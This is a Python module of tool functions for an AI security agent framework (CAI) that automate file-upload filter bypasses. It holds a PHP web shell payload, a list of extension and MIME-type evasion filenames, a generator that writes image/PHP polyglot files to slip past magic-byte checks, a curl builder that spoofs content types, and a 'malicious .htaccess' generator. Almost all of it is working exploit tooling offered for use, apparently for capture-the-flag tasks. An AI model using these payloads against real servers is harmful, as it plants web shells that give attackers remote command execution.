"""
File-upload bypass helpers for CAI.

Generates payload variants and curl commands for the most common
extension/content-type/magic-byte filtering bypasses, plus a polyglot
file generator (GIF89a-prefixed PHP) usable when the server validates
file headers.
"""
from __future__ import annotations

import os
import shlex
from typing import List, Optional

from cai.sdk.agents import function_tool


# ── Bypass technique catalogue ──────────────────────────────────────

PHP_BASE_PAYLOAD = "<?php system($_GET['cmd']); ?>"

# (filename, content_type, technique_label)
EXTENSION_VARIANTS: List[tuple[str, str, str]] = [
    ("shell.php",          "application/x-php",     "plain .php"),
    ("shell.phtml",        "application/x-httpd-php", ".phtml (alternative PHP ext)"),
    ("shell.phar",         "application/octet-stream", ".phar (PHP archive ext)"),
    ("shell.php.jpg",      "image/jpeg",            "double extension .php.jpg"),
    ("shell.jpg.php",      "image/jpeg",            "double extension .jpg.php"),
    ("shell.PhP",          "application/x-php",     "case-mixing .PhP"),
    ("shell.php5",         "application/x-php",     "PHP version-specific .php5"),
    ("shell.php7",         "application/x-php",     "PHP version-specific .php7"),
    ("shell.pHtMl",        "application/x-httpd-php", "case-mixing .pHtMl"),
    ("shell.php%00.jpg",   "image/jpeg",            "null-byte truncation .php%00.jpg"),
    ("shell.php;.jpg",     "image/jpeg",            "semicolon truncation .php;.jpg"),
    ("shell.php .jpg",     "image/jpeg",            "trailing-space variant"),
    ("shell.htaccess",     "text/plain",            ".htaccess override (AddType for any ext)"),
]


def _generate_upload_bypass_payloads_impl() -> str:
    lines = [
        "=== Upload bypass variants ===",
        "(filename, Content-Type, technique)",
        "",
    ]
    for fn, ct, tech in EXTENSION_VARIANTS:
        lines.append(f"  {fn:24s}  ct={ct:30s}  ← {tech}")
    lines.append("")
    lines.append("Hints:")
    lines.append("  - If extension blacklist filters .php/.phtml, try .phar/.php5/.php7.")
    lines.append("  - If MIME-type check, lie with -F 'file=@...;type=image/jpeg'.")
    lines.append("  - If magic-byte check, prepend GIF89a header (use generate_polyglot_php).")
    lines.append("  - If everything is filtered, upload .htaccess + plain .jpg with PHP.")
    return "\n".join(lines)


# Magic-byte prefixes for the supported polyglot formats. Minimal viable
# sequences — enough for exif_imagetype() / getimagesize() / file(1) to
# classify the upload as the claimed image type. JPEG SOI is the 3 bytes
# \xff\xd8\xff and the 4th byte must be a valid marker (\xe0..\xef);
# \xe0 (APP0/JFIF) is the standard choice.
_POLYGLOT_MAGIC: dict[str, bytes] = {
    "gif": b"GIF89a;\n",
    "jpeg": b"\xff\xd8\xff\xe0",
    "jpg": b"\xff\xd8\xff\xe0",
    "png": b"\x89PNG\r\n\x1a\n",
    "bmp": b"BM",
}


def _generate_polyglot_php_impl(out_path: str = "/tmp/poly.jpg",
                                php_payload: str = PHP_BASE_PAYLOAD,
                                image_format: str = "gif") -> str:
    """Write a file that is simultaneously a valid image and executable PHP.

    The file starts with image-format magic bytes (so exif_imagetype /
    getimagesize / file(1) accept the upload), then continues with PHP
    code that runs when the file is fetched as .php.

    Supported formats: gif (default, GIF89a), jpeg/jpg, png, bmp.
    """
    fmt = (image_format or "gif").lower()
    magic = _POLYGLOT_MAGIC.get(fmt)
    if magic is None:
        return (
            f"Error: unsupported image_format '{image_format}'. "
            f"Choose from: {sorted(_POLYGLOT_MAGIC)}."
        )
    body = magic + php_payload.encode()
    try:
        with open(out_path, "wb") as f:
            f.write(body)
    except Exception as exc:
        return f"Error writing polyglot to {out_path}: {exc}"
    magic_hex = magic[:8].hex(" ").upper()
    return (
        f"Polyglot written to {out_path} ({len(body)} bytes).\n"
        f"Format: {fmt} — first bytes (hex): {magic_hex}\n"
        f"PHP body: {php_payload}\n"
        f"Upload it with content-type image/{fmt}, then access as .php to trigger."
    )


def _build_upload_curl_impl(  # pylint: disable=too-many-arguments
    target_url: str,
    file_path: str,
    field_name: str = "file",
    content_type: str = "",
    cookies: str = "",
    extra_form_fields: Optional[dict] = None,
    rename_as: str = "",
) -> str:
    """Build a curl command for a multipart upload with optional MIME spoof."""
    parts = ["curl", "-s", "-i", "-L"]
    if cookies:
        parts.extend(["-b", shlex.quote(cookies)])

    # File field
    field_value = f"@{file_path}"
    if rename_as:
        field_value += f";filename={rename_as}"
    if content_type:
        field_value += f";type={content_type}"
    parts.extend(["-F", shlex.quote(f"{field_name}={field_value}")])

    # Extra fields if the form requires them (CSRF tokens, etc.)
    if extra_form_fields:
        for k, v in extra_form_fields.items():
            parts.extend(["-F", shlex.quote(f"{k}={v}")])

    parts.append(shlex.quote(target_url))
    return " ".join(parts)


def _htaccess_payload_impl(extension: str = "jpg") -> str:
    """Return contents for a malicious .htaccess that makes Apache treat
    files with the given extension as PHP. Upload alongside a .jpg
    containing PHP code.
    """
    return f"AddType application/x-httpd-php .{extension}\n"


# ── @function_tool surface ──────────────────────────────────────────

@function_tool(strict_mode=False)
def generate_upload_bypass_payloads(ctf=None) -> str:  # pylint: disable=unused-argument
    """Return a printable catalogue of common file-upload bypass variants
    (extension tricks, case mixing, double extensions, null bytes,
    semicolon truncation, .htaccess override).

    Use these as candidate filenames + content-types to try against an
    upload form that filters by name or MIME.
    """
    return _generate_upload_bypass_payloads_impl()


@function_tool(strict_mode=False)
def generate_polyglot_php(
    out_path: str = "/tmp/poly.jpg",
    php_payload: str = PHP_BASE_PAYLOAD,
    image_format: str = "gif",
    ctf=None,  # pylint: disable=unused-argument
) -> str:
    """Write an image/PHP polyglot: starts with the chosen format's magic
    bytes (passes exif_imagetype / getimagesize / file(1) checks) and
    continues with PHP code (runs when fetched as .php).

    Args:
        out_path: Where to write the polyglot (default /tmp/poly.jpg).
        php_payload: PHP code to embed (default: GET-based system() shell).
        image_format: One of 'gif' (default), 'jpeg'/'jpg', 'png', 'bmp'.
            Pick the format the target validates against — when in doubt,
            jpeg works against the broadest range of servers.

    Returns:
        Status message including bytes written, format used, magic-byte
        hex preview, and a usage hint.
    """
    return _generate_polyglot_php_impl(
        out_path=out_path,
        php_payload=php_payload,
        image_format=image_format,
    )


@function_tool(strict_mode=False)
def build_upload_curl(  # pylint: disable=too-many-arguments
    target_url: str,
    file_path: str,
    field_name: str = "file",
    content_type: str = "",
    cookies: str = "",
    extra_form_fields: Optional[dict] = None,
    rename_as: str = "",
    ctf=None,  # pylint: disable=unused-argument
) -> str:
    """Build a shell-safe curl command for a multipart file upload.

    Args:
        target_url: The upload endpoint.
        file_path: Local path of the file to send.
        field_name: Form field name (default 'file').
        content_type: Optional Content-Type to spoof (e.g. 'image/jpeg').
        cookies: Optional cookie string for authenticated uploads.
        extra_form_fields: Dict of extra form fields (CSRF tokens, etc.).
        rename_as: Override filename sent to the server.

    Returns:
        Ready-to-execute curl command.
    """
    return _build_upload_curl_impl(
        target_url=target_url, file_path=file_path,
        field_name=field_name, content_type=content_type,
        cookies=cookies, extra_form_fields=extra_form_fields,
        rename_as=rename_as,
    )


@function_tool(strict_mode=False)
def htaccess_payload(extension: str = "jpg", ctf=None) -> str:  # pylint: disable=unused-argument
    """Return the contents of a malicious .htaccess that makes Apache
    treat files with ``extension`` as PHP. Upload it together with an
    image that contains PHP code in its body.

    Args:
        extension: File extension to weaponize (default 'jpg').

    Returns:
        Single-line string suitable for: echo '<output>' > .htaccess
    """
    return _htaccess_payload_impl(extension)
